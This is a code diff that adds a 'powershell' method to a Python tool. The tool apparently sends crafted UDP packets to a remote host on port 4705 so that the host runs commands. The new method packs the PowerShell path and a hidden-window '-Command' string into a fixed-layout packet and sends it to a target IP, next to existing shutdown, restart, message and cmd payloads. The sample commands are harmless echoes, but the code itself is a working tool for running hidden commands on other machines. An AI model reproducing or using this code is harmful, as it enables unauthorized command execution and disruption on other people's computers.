@@ -142,6 +142,36 @@ class Send:
                 logger.error(f"OSError ({type(e).__name__}): {e}")
         logger.info(f"Send CMD packet to {address[0]} on port {address[1]}: {command}")
 
+    def powershell(self, address: Tuple[str, int], command: str, keep_window: bool = False):
+        powershell_exe_dir = "C:\WINDOWS\system32\WindowsPowerShell\v1.0\\powershell.exe"
+
+        powershell_exe_dir = self._encode_str(powershell_exe_dir)
+        if keep_window:
+            full_command = self._encode_str(f" -NoExit -NoLogo -WindowStyle Hidden -Command \"& {{{command}}}\"")
+        else:
+            full_command = self._encode_str(f" -NoLogo -WindowStyle Hidden -Command \"& {command}\"")
+
+        logger.debug(f"Command: {full_command}")
+
+        packet = bytearray(Payload.CMD)
+        packet.extend(powershell_exe_dir)
+        packet.extend(b"\x00" * (512 - len(powershell_exe_dir)))
+
+        packet.extend(full_command)
+        packet.extend(b"\x00" * (324 - len(full_command)))
+
+        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            try:
+                sock.sendto(packet, address)
+            except socket.gaierror as e:
+                logger.error(f"socket.gaierror: {e}")
+                raise
+            except OSError as e:
+                logger.error(f"OSError ({type(e).__name__}): {e}")
+        logger.info(f"Send POWERSHELL packet to {address[0]} on port {address[1]}: {command}")
+
 
 def get_localhost() -> str:
     hostname = socket.gethostname()
@@ -157,6 +187,7 @@ CMD_DIR = _resource_dir(".\\assets\\cmd.bin")
 read_payload(SHUTDOWN_DIR, RESTART_DIR, MSG_DIR, CMD_DIR)
 
 if __name__ == '__main__':
+    print("Your IP: ", get_localhost())
     ADDR = ("10.165.43.52", 4705) # edit this test ip before
     send = Send()
-    send.cmd(ADDR, "color ce;echo sb", True)
+    send.powershell(ADDR, "echo aaaaa", True)
